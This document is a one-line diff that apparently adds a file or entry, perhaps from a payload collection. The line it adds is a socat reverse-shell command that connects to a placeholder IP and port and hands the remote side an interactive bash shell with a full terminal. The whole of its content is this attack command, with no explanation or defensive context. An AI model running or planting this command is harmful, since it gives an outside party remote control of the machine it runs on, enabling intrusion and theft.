@@ -1,0 +1,2 @@
+socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
+
